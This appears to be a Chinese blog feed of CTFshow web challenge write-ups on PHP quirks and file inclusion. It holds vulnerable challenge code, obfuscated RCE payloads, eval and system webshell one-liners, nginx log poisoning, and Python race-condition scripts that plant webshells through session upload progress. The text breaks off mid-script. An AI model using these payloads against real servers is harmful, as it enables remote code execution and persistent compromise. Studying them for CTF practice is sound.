punctuation">&#125;</span></code></pre><p>正则运算都被ban了，可以使用<code>|</code>和<code>~</code>或者三目运算符，另外<code>&quot;</code>也被ban了，可以使用<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(‘%13%19%13%14%05%0d’|’%60%60%60%60%60%60’)(‘%14%01%03%00%06%0c%01%07%02%10%08%10’|’%60%60%60%20%60%60%60%60%2c%60%60%60’)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>三目运算符被ban了，但是影响不大</p><h4 id="web147-PHP命名空间-create-function函数代码注入"><a href="#web147-PHP命名空间-create-function函数代码注入" class="headerlink" title="web147(PHP命名空间  create_function函数代码注入)"></a>web147(PHP命名空间  create_function函数代码注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>正则匹配绕过，只要ctfshow里有一个不是数字、小写字母和下划线就能绕过。</p><blockquote><p><strong>&#x2F;i</strong>：大小写不敏感匹配</p><p><strong>&#x2F;s</strong>：点号元字符匹配所有字符，包含换行符。</p><p><strong>&#x2F;D</strong>：元字符美元符号仅仅匹配目标字符串的末尾</p></blockquote><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 调用一个函数时直接写函数名function_name()，相当于是相对路径调用； 如写某一全局函数的完全限定名称\function_name()调用，则是写了一个绝对路径。</p></blockquote><p><img src="web147.png" alt="在这里插入图片描述" loading="lazy"></p><p>（详情可以看php手册里的命名空间部分）</p><p>所以post时<code>ctf</code>可以通过加上<code>\</code>绕过匹配。%5c</p><p>找个不需要第一个参数的函数。可以用create_function匿名函数。虽然该函数自PHP 7.2起已经弃用，但是还是可以eval执行函数，只是需要把匿名部分闭合。</p><p><strong>get</strong>：<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>：<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="在这里插入图片描述" loading="lazy"></p><p>可以这么理解：create_function创建一个匿名函数，我们假设就叫niming。 <code>string create_function( string $args, string $code)</code>那么具体就是如下面所示的样子：</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>所以就需要<code>&#125;</code>闭合，闭合之后，那就多出来一个<code>&#125;</code>，这就需要用注释符注释掉。</p><h4 id="web148-中文变量-异或"><a href="#web148-中文变量-异或" class="headerlink" title="web148(中文变量  异或)"></a>web148(中文变量  异或)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>没ban异或</p><p>Payload：<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>预期解是使用中文 <code>?code=$哈=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> 异或出来的结果是 _GET</p><h4 id="web149-unlink-文件覆盖"><a href="#web149-unlink-文件覆盖" class="headerlink" title="web149(unlink  文件覆盖)"></a>web149(unlink  文件覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> 函数删除文件。</p><p>若成功，则返回 true，失败则返回 false。</p><p>直接向index.php写马就行</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#过滤字符</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIP可以通过extract进行变量覆盖，ctf被限制不能有:</p><p>可以利用nginx日志文件写马</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>过滤了log，看着可以用条件竞争</p><p>看了hint 利用 <code>__autoload()</code></p><p>于是查了一下 <code>class_exists()</code> 这个函数</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>修复了非预期，不让包含日志文件了。</p><p>这里利用了 <code>extract</code> 覆盖变量会把 <code>空格 [ .</code> 都给转成下划线的特性，绕过正则过滤。然后就是 <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> 第二个参数默认为 <code>true</code>，在类不存在时会调用 <code>__autoload</code> 函数，<code>__autoload</code> 这里写的是调用要加载的类名的函数，传 <code>phpinfo</code> 就能得到 <code>session</code>相关信息，从而包含 <code>session</code>。</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>可以看到 <code>session.use_strict_mode</code> 为 Off，说明可以自定义 <code>session_id</code>，控制 <code>session</code> 文件名， <code>session.save_path</code> 为空，确定文件包含路径 <code>/tmp/sess_&#123;session_id&#125;</code>。改一下祖传脚本写 shell。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'verysafe.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ctf"</span><span class="token punctuation">:</span> <span class="token string">"/tmp/sess_down"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'aaaaaa'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>[PHP文件包含漏洞（利用phpinfo）](<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub&#x2F;php&#x2F;inclusion&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub (github.com)</a>)</p><p>这篇详细讲解了漏洞的利用，之前的条件竞争就是这样</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-include</title>
      <link href="/2024/06/29/web%E5%85%A5%E9%97%A8-include/"/>
      <url>/2024/06/29/web%E5%85%A5%E9%97%A8-include/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要考察是php伪协议，之前Rce里也有提过，这里放几个常用Payload</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p></blockquote><blockquote><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php  </p></blockquote><blockquote><p>php:&#x2F;&#x2F;input<br>POST cmd</p></blockquote><h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>签到</p><p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>将php过滤，可以考虑data</p><p>Payload:</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></blockquote><h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>data也被ban了</p><p>使用nginx日志文件包含，在User-Agent写入一句话木马，使用蚁剑连接<a href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p><p>Payload:</p><blockquote><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>User-Agent: <?php @eval($_POST['attack']);?></p></blockquote><p>看题解也可以大小写绕过用PHP:&#x2F;&#x2F;input</p><h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>多过滤了冒号，所以依旧可以nginx日志注入</p><h4 id="web82-利用session-upload-progress进行文件包含"><a href="#web82-利用session-upload-progress进行文件包含" class="headerlink" title="web82(利用session.upload_progress进行文件包含)"></a>web82(利用session.upload_progress进行文件包含)</h4><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>但是问题来了，默认配置session.upload_progress.cleanup &#x3D; on导致文件上传后，session文件内容立即清空，</p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><p><strong>session文件默认存储路径</strong></p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p><strong>方法一:</strong></p><p>先以POST的形式发包，上传的文件随意,下面是构造的上传表单</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>使用burp进行爆破（两个要同时爆破）</p><p><img src="web82.png" loading="lazy"></p><p><img src="web82_2.png" loading="lazy"></p><p>最后竞争得到flag</p><p><strong>方法二</strong>:</p><p>可以利用脚本进行条件竞争</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token 